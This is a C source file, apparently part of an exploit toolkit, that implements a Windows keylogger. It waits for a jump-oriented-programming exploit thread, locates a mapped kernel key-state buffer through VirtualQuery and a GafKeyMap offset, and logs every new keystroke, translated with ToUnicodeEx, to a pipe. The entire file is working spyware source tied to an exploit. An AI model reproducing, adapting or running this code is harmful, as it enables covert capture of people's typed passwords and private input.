#include "launcher/keylog.h"
#include "jop/offsets.h"
#include "utils/alloc.h"
#include "utils/error.h"
#include <basetsd.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <synchapi.h>
#include <wchar.h>
#include <winuser.h>

DWORD keylog_start(KeyLogParams *params)
{
    bool status = false;
    void *keylog_map_address = nullptr;
    HANDLE write_pipe = params->child_pipe;

    CHILD_LOG_SUCCESS(write_pipe, "Starting keylog. Waiting for JOP to succeed...\n");

    WaitForSingleObject(params->jop_thread, INFINITE);

    CHILD_LOG_SUCCESS(write_pipe, "JOP thread is done !\n");

    CloseHandle(params->jop_thread);

    CHILD_LOG_SUCCESS(write_pipe, "Closing pipes\n");
    for (size_t i = 0; i < params->pipes->length; i++)
    {
        CloseHandle(((NonPagedBuffer *)params->pipes->buffer[i])->write_pipe);
        CloseHandle(((NonPagedBuffer *)params->pipes->buffer[i])->read_pipe);
    }

    status = keylog_find_memory_mapped_buffer(write_pipe, &keylog_map_address);
    if (status == false)
        goto end;

    keylog_main_loop(write_pipe, keylog_map_address);

end:
    CHILD_LOG_SUCCESS(write_pipe, "Keylog thread is done !\n");
    return 0;
}

void keylog_main_loop(HANDLE child_pipe, uint8_t *map_base_address)
{
    uint8_t previous_state[64] = {0};
    uint8_t keyboard_state[256] = {0};
    UINT scan_code = 0;
    int result = 0;
    wchar_t *buffer = nullptr;
    HKL keyboard_layout = {0};

    buffer = jalloc(0x20);
    if (buffer == nullptr)
        return;

    keyboard_layout = GetKeyboardLayout(0);

    CHILD_LOG_SUCCESS(child_pipe, "Starting keylogger !\n");

    while (true)
    {
        for (uint8_t i = 0; i < MAXUINT8; i++)
        {
            keyboard_state[i] = 0;
            if (IS_KEY_DOWN(map_base_address, i))
                keyboard_state[i] |= KS_DOWN_BIT;
            if (IS_KEY_LOCKED(map_base_address, i))
                keyboard_state[i] |= KS_LOCK_BIT;
        }
        for (uint8_t j = 9; j < MAXUINT8; j++)
        {
            if (IS_KEY_DOWN(map_base_address, j) && !IS_KEY_DOWN(previous_state, j))
            {
                scan_code = MapVirtualKey(j, MAPVK_VSC_TO_VK_EX);
                result = ToUnicodeEx(
                    (UINT)j,
                    scan_code,
                    keyboard_state,
                    buffer,
                    0x20,
                    0,
                    keyboard_layout
                );
                if (result > 0)
                    CHILD_LOG_KEYSTROKE(child_pipe, "%S", buffer);
            }
        }
        memcpy(previous_state, map_base_address, sizeof(previous_state));
        Sleep(5);
    }

    return;
}

bool keylog_find_memory_mapped_buffer(HANDLE child_pipe, void **keylog_base_address)
{
    bool status = false;
    MEMORY_BASIC_INFORMATION infos = {0};
    void *memory_pointer = nullptr;
    size_t bytes_returned = 0;
    void *keylog_memory_base_address = nullptr;

    do
    {
        bytes_returned = VirtualQuery(memory_pointer, &infos, sizeof(infos));
        if (bytes_returned != sizeof(infos))
        {
            CHILD_LOG_ERROR(
                child_pipe,
                "VirtualQuery returned unexpected number of bytes: %lx\n",
                bytes_returned
            );
            goto end;
        }
        if (infos.AllocationProtect & PAGE_NOCACHE)
        {
            CHILD_LOG_SUCCESS(child_pipe, "Found region @ 0x%p\n", infos.BaseAddress);
            keylog_memory_base_address = infos.BaseAddress;
            continue;
        }
        memory_pointer += infos.RegionSize;

    } while (keylog_memory_base_address == 0);

    keylog_memory_base_address += (GafKeyMap_OFFSET % 0x1000);
    *keylog_base_address = keylog_memory_base_address;

    status = true;
end:
    return status;
}